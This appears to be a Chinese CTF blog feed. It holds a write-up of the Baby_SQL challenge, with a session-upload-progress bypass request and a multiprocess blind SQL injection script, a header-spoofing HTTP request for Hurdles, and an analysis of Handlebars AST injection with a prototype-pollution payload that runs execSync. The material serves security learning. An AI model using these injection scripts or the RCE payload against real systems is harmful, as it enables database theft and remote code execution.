class="line">		paramsPost = &#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;kk&quot;</span>,<span class="string">&quot;email&quot;</span>:email&#125;</span><br><span class="line">		r2 = requests.post(<span class="string">&quot;http://a5e38411-27dd-44db-aaa2-76ee10062321.node3.buuoj.cn/login.php&quot;</span>, data=paramsPost)</span><br><span class="line">		<span class="comment"># print(r2.text)</span></span><br><span class="line">		results = re.findall(<span class="string">r&quot;&lt;span class=\&quot;user-name\&quot;&gt;\n(.*)&lt;/span&gt;&quot;</span>, r2.text)[<span class="number">0</span>].strip()</span><br><span class="line">		results = binascii.a2b_hex(binascii.a2b_hex(results)).decode()</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[Results] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(results))</span><br><span class="line">		<span class="keyword">if</span> results == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		flag += results</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(e)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		<span class="comment"># print(&quot;[Results] nothing!&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[Flag] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>右键源码</p>
<p>首先全部都加了 addslashes 过滤，网站用的是 utf-8 编码，不能宽字节绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    !<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) AND <span class="keyword">die</span>(<span class="string">&quot;Hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册用户名做了如下过滤，非常严格</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(a|d|m|i|n)/&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">6</span> OR <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &gt; <span class="number">10</span> OR !<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>登陆用户名几乎没做过滤，那先面就是绕过<code>isset($_SESSION)了</code> ，这里利用到了之前 session 反序列化的知识了</p>
<p>session.upload_progress.enabled 为 On</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</span><br></pre></td></tr></table></figure>

<p>所以发送一个请求包就可以绕过进行 sqli 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /templates/login.php HTTP/1.1</span><br><span class="line">Host: 0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=12269a1e808109b9d86291543e02cdd0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Length: 145</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryzALlheET</span><br></pre></td></tr></table></figure>

<p>下面的就是盲注了，直接上脚本，注意要使用 files 参数，不然无法文件形式传数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ptbctf</span></span><br><span class="line"><span class="comment"># flag_tbl</span></span><br><span class="line"><span class="comment"># secret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">index, results</span>):</span><br><span class="line"></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    m = (l+r)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        url = <span class="string">&#x27;http://0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cn/templates/login.php&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;\&quot; or if((ascii(mid((select secret from flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;),1,0)-- -&quot;</span>.<span class="built_in">format</span>(index+<span class="number">1</span>, m)</span><br><span class="line">        paramsGet = &#123;<span class="string">&quot;password&quot;</span>:<span class="string">&quot;tyaoo&quot;</span>,<span class="string">&quot;username&quot;</span>:payload&#125;</span><br><span class="line">        paramsPost = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;tyaoo&quot;</span>&#125;</span><br><span class="line">        cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;12269a1e808109b9d86291543e02cdd0&quot;</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">        res = requests.post(url,files=files, data=paramsPost, params=paramsGet, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;again&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            r = m</span><br><span class="line">            m = (l+r)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">            m = (l+r)//<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(index+<span class="number">1</span>, m)</span><br><span class="line">    results[index] = m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    num = <span class="number">5</span></span><br><span class="line">    data_num = <span class="number">50</span></span><br><span class="line">    data = <span class="built_in">range</span>(data_num)</span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    results = manager.<span class="built_in">list</span>([<span class="number">0</span>]*data_num)</span><br><span class="line">    jobs = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        job = pool.apply_async(func, (d, results))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="built_in">print</span>(results)</span><br><span class="line">    results = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> results])</span><br><span class="line">    <span class="built_in">print</span>(results)</span><br></pre></td></tr></table></figure>



<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>改了一堆 http 头</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%25%30%30%0a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node3.buuoj.cn:27815</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic cGxheWVyOjU0ZWYzNmVjNzEyMDFmZGY5ZDE0MjNmZDI2Zjk3ZjZi</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>1337(v.9001)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>ru</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>Fortune=6265</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>13.37.13.37,127.0.0.1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://ctf.bsidessf.net</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://ctf.bsidessf.net/challenges</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Handlebars AST注入</title>
    <url>/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>详细分析Handlebars AST注入</p>
</blockquote>
<span id="more"></span>

<h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210925163678af9e286637ed6de903.png" alt="image-20210925022250921" style="zoom:80%;" />

<p><code>handlebars</code>的<code>parser</code>在解析<code>NumberLiteral</code>类型的字符串时会使用<code>Number()</code>函数进行强制转换，正常情况下这个字符串只能数字，但是用过原型链污染我们可以构造一个非数字型的字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\parser.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;StringLiteral&#x27;</span>, <span class="attr">value</span>: $$[$<span class="number">0</span>], <span class="attr">original</span>: $$[$<span class="number">0</span>], <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;NumberLiteral&#x27;</span>, <span class="attr">value</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">original</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在将AST编译为函数时，<code>handlebars</code>用<code>pushString</code>将字符串传到<code>opcode</code>中，用<code>pushLiteral</code>将数字和布尔值传入到<code>opcode</code>中，而这个<code>opcode</code>就是之后用来构造模板函数的，<code>Literal</code>类型在AST中表示变量的意思，具体可以参考<a href="https://docs.esprima.org/en/latest/syntax-tree-format.html">Esprima语法树标准</a>，所以我们下面我们能够利用的类型有<code>NumberLiteral</code>和<code>BooleanLiteral</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">StringLiteral</span>: <span class="keyword">function</span> <span class="title function_">StringLiteral</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushString&#x27;</span>, string.<span class="property">value</span>); <span class="comment">// 字符串使用pushString</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">NumberLiteral</span>: <span class="keyword">function</span> <span class="title function_">NumberLiteral</span>(<span class="params">number</span>) &#123; </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, number.<span class="property">value</span>); <span class="comment">// 数字使用pushLiteral</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">BooleanLiteral</span>: <span class="keyword">function</span> <span class="title function_">BooleanLiteral</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, bool.<span class="property">value</span>);  <span class="comment">// 布尔值使用pushLiteral</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="title class_">UndefinedLiteral</span>: <span class="keyword">function</span> <span class="title function_">UndefinedLiteral</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;pushLiteral&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">opcode</span>: <span class="keyword">function</span> <span class="title function_">opcode</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">opcodes</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">      <span class="attr">opcode</span>: name,</span><br><span class="line">      <span class="attr">args</span>: slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="attr">loc</span>: <span class="variable language_">this</span>.<span class="property">sourceNode</span>[<span class="number">0</span>].<span class="property">loc</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>那么我们如何调用这些函数呢，<code>handlebars</code>在编译语法树时会调用一个叫<code>accept</code>的函数来处理我们的语法树节点，他会调用<code>node.type</code>对应的构造函数来修改<code>opcode</code>，所以我们的重点也可以转换成如何控制<code>accept(node)</code>中<code>node</code>值，且保证解析流程正常进行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node); <span class="comment">// 调用node.type对应的构造函数</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>



<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><blockquote>
<p>原文作者采用的payload</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Handlebars</span> <span class="operator">=</span> require(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line">Object.prototype.type = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line">Object.prototype.body = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;start&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">var</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="type">var</span> <span class="variable">template</span> <span class="operator">=</span> Handlebars.compile(source);</span><br><span class="line">console.log(template(&#123;&#125;));</span><br></pre></td></tr></table></figure>

<p>大概流程：</p>
<ol>
<li>将<code>type</code>修改为<code>Program</code>绕过<code>Lexer</code>解析</li>
<li>污染<code>Program</code>中的<code>body</code>，注入自定义的<code>AST</code></li>
<li>在<code>compiler.js</code>文件中找到可用<code>Gadget</code>，此<code>Gadget</code>能够控制<code>accept(node)</code>中<code>node</code>值，原文作者利用的是<code>MustacheStatement</code></li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">compiler.<span class="property">js</span>/<span class="title function_">ret</span>()</span><br><span class="line">    compiler.<span class="property">js</span>/<span class="title function_">compileInput</span>()</span><br><span class="line">        base.<span class="property">js</span>/<span class="title function_">parse</span>()</span><br><span class="line">            base.<span class="property">js</span>/<span class="title function_">parseWithoutProcessing</span>()</span><br><span class="line">            visitor.<span class="property">js</span>/<span class="title function_">accept</span>()</span><br><span class="line">        compiler.<span class="property">js</span>/<span class="title function_">compile</span>()</span><br><span class="line">            compiler.<span class="property">js</span>/<span class="title function_">accept</span>()</span><br><span class="line">                compiler.<span class="property">js</span>/<span class="title class_">Program</span>()</span><br><span class="line">                    compiler.<span class="property">js</span>/<span class="title class_">MustacheStatement</span>()</span><br><span class="line">                        compiler.<span class="property">js</span>/<span class="title class_">NumberLiteral</span>() &lt;-- 注入payload</span><br><span class="line">        javascript-compiler.<span class="property">js</span>/<span class="title function_">compile</span>()</span><br><span class="line">            javascript-compiler.<span class="property">js</span>/createFunctionContext &lt;-- 生成模板函数体</span><br><span class="line">        handlebars.<span class="property">runtime</span>.<span class="property">js</span>/<span class="title function_">create</span>()</span><br><span class="line">    runtime.<span class="property">js</span>/<span class="title function_">ret</span>()</span><br><span class="line">        runtime.<span class="property">js</span>/<span class="title function_">executeDecorators</span>()</span><br><span class="line">        anonymous/templateSpec.<span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>

<h4 id="解析入口"><a href="#解析入口" class="headerlink" title="解析入口"></a>解析入口</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context, execOptions</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!compiled) &#123;</span><br><span class="line">      compiled = <span class="title function_">compileInput</span>(); <span class="comment">// 编译输入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compiled.<span class="title function_">call</span>(<span class="variable language_">this</span>, context, execOptions);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="解析AST"><a href="#解析AST" class="headerlink" title="解析AST"></a>解析AST</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), <span class="comment">// 获取语法树</span></span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options), </span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>语法树解析</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ast = <span class="title function_">parseWithoutProcessing</span>(input, options); <span class="comment">// 转化为AST</span></span><br><span class="line">  <span class="keyword">var</span> strip = <span class="keyword">new</span> _whitespaceControl2[<span class="string">&#x27;default&#x27;</span>](options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> strip.<span class="title function_">accept</span>(ast); <span class="comment">// 解析AST</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的重点是将<code>input.type</code>污染为<code>Program</code>，从而绕过AST的转换阶段</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\base.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseWithoutProcessing</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="comment">// Just return if an already-compiled AST was passed in.</span></span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">type</span> === <span class="string">&#x27;Program&#x27;</span>) &#123; <span class="comment">// 如果已经是转换好的AST就直接返回</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="property">yy</span> = yy;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Altering the shared object here, but this is ok as parser is a sync operation</span></span><br><span class="line">  yy.<span class="property">locInfo</span> = <span class="keyword">function</span> (<span class="params">locInfo</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> yy.<span class="title class_">SourceLocation</span>(options &amp;&amp; options.<span class="property">srcName</span>, locInfo);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ast = _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="title function_">parse</span>(input); <span class="comment">// 否则就调用Lexer解析节点生成AST</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是递归解析语法树</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\visitor.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!object) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[object.<span class="property">type</span>]) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + object.<span class="property">type</span>, object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">current</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">parents</span>.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">current</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">current</span> = object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[object.<span class="property">type</span>](object); <span class="comment">// 调用对应的构造函数解析AST</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">current</span> = <span class="variable language_">this</span>.<span class="property">parents</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">mutating</span> || ret) &#123;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret !== <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h4 id="编译环境变量"><a href="#编译环境变量" class="headerlink" title="编译环境变量"></a>编译环境变量</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options), <span class="comment">// 编译环境变量</span></span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">compile</span>: <span class="keyword">function</span> <span class="title function_">compile</span>(<span class="params">program, options</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">opcodes</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">children</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = options;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">stringParams</span> = options.<span class="property">stringParams</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">trackIds</span> = options.<span class="property">trackIds</span>;</span><br><span class="line"></span><br><span class="line">    options.<span class="property">blockParams</span> = options.<span class="property">blockParams</span> || [];</span><br><span class="line"></span><br><span class="line">    options.<span class="property">knownHelpers</span> = _utils.<span class="title function_">extend</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), &#123;</span><br><span class="line">      <span class="attr">helperMissing</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">blockHelperMissing</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">each</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;if&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">unless</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;with&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">lookup</span>: <span class="literal">true</span></span><br><span class="line">    &#125;, options.<span class="property">knownHelpers</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">accept</span>(program); <span class="comment">// 传入accept函数进行处理</span></span><br><span class="line">  &#125;,</span><br><span class="line">     </span><br></pre></td></tr></table></figure>

